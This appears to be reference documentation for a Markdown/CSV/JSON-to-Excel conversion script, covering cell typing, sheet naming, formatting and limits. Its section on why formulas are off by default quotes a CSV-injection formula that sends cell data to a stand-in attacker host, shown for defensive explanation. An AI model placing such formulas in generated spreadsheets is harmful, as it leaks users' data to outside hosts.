# md-to-xlsx reference

How `scripts/md_to_xlsx.py` reads its input and types each cell, so you can predict the
workbook and explain a warning without reading the script.

## Inputs

| Input | Sheets | Header |
|---|---|---|
| `.md`, `.markdown` | One per pipe table (a header row, then a `\|---\|` separator row). Tables inside fenced code blocks are skipped | The table's header row |
| `.csv`, `.tsv` | One, named after the file | The first row. The delimiter is detected among `,` `;` tab and `\|`; `.tsv` is always tab |
| `.json` array of objects | One, named after the file | The union of keys, in first-seen order. A missing key is an empty cell |
| `.json` array of arrays | One | The first inner array |
| `.json` object of arrays | One per key, named after the key | As above, per key |

Files must be UTF-8 (a BOM is fine). From Excel, save CSVs as **CSV UTF-8**.

## Typing rules, in the order they're tried

1. Empty or whitespace: no cell written.
2. Starts with `=` (and is longer than one character): a formula with `--formulas`, otherwise text.
3. `true` / `false`, any case: boolean.
4. ISO 8601 date `YYYY-MM-DD`, or date-time `YYYY-MM-DDTHH:MM[:SS[.fff]]` with an optional `Z`
   or `±HH:MM`: an Excel date serial, formatted `yyyy-mm-dd`, `yyyy-mm-dd hh:mm` or
   `yyyy-mm-dd hh:mm:ss`. Impossible dates (`2026-02-30`) and years before 1900 stay text.
   Excel has no time zones, so the offset is dropped and the time is kept as written, with a warning.
5. Number: optional sign, optional `$` `£` `€`, digits with optional `,` thousands groups, an
   optional decimal part, an optional `%`. Plus scientific notation (`1.2e6`). Stays **text** when:
   - the integer part has a leading zero and more than one digit (`007`, `02134`)
   - it has more than 15 significant digits, the most Excel stores exactly
   - it has both a currency sign and `%`
6. Everything else: text. Text longer than 32,767 characters, Excel's cell limit, is cut, with a warning.

Formats applied:

| Source | Format code |
|---|---|
| `1,240` / `1,240.50` | `#,##0` / `#,##0.00` |
| `12%` / `12.5%` | `0%` / `0.0%` (decimals follow the source) |
| `$1,240.00` | `"$"#,##0.00` |
| `1240`, `3.5` | General |

**JSON** values keep their JSON type: numbers stay numbers, `true`/`false` stay booleans and
`null` is empty. Strings go through steps 2 and 4 only (formulas and dates), never the number rule.
Nested objects and arrays are written as JSON text, with a warning.

**Markdown cells** are cleaned first: `**bold**`, `*italic*`, `` `code` ``, `~~strike~~`,
links, images and HTML tags are reduced to their text, `\|` becomes `|`, and
`<br>` becomes a line break in a wrapped cell. Links aren't kept as hyperlinks.

## Why formulas are off by default

A cell that starts with `=` (and in some apps `+`, `-` or `@`) is evaluated when the file is
opened. A table from an export, a web form or a scraped page can carry formulas such as
`=HYPERLINK("https://attacker.example/?d="&A2, "Click")` or `WEBSERVICE` calls that send cell
contents elsewhere. OWASP documents this as CSV injection. Written as text, the same cell is
inert: the user sees the formula and can retype it if they mean it. With `--formulas`, the
workbook is marked to recalculate on open, because the script writes no cached results.

## Sheet names

Excel requires a sheet name to be 1 to 31 characters, with none of `[ ] : * ? / \`, not to
start or end with an apostrophe, and to be unique regardless of case. "History" is reserved.
The script:

1. takes the nearest heading above the table (any level), with Markdown removed
2. replaces forbidden characters with spaces and collapses whitespace
3. cuts to 31 characters at a word boundary, without leaving half a parenthetical
4. renames `History` to `History data`
5. de-duplicates with ` (2)`, ` (3)`
6. falls back to `Table N` when there is no heading, or to the file name for CSV and JSON

Every rename prints a warning with the old and new names.

## What every sheet gets

- Header row in bold, on a light grey fill, with a thin bottom border
- Header frozen (row 1 stays visible when scrolling)
- An autofilter over the whole table, plus the hidden `_xlnm._FilterDatabase` name Excel expects
- Column widths from the longest value in each column, between 8 and 60 characters
- Rows shorter than the header padded with empty cells. Extra cells get a `Column N` header. Both are reported.

## Package parts

`xl/workbook.xml`, `xl/worksheets/sheetN.xml`, `xl/styles.xml` (number formats, two fonts,
header fill and border), `xl/sharedStrings.xml` (every distinct string stored once),
`docProps/core.xml` (title) and `docProps/app.xml`, plus the content types and relationships.

## Limits and exit codes

The script refuses more than 1,048,576 rows or 16,384 columns per sheet, which are Excel's limits.
It exits `1` on bad input: file not found, not UTF-8, unsupported extension, no tables in a
Markdown file, empty CSV, invalid JSON or JSON of the wrong shape, output not ending in
`.xlsx`, or a missing output folder.
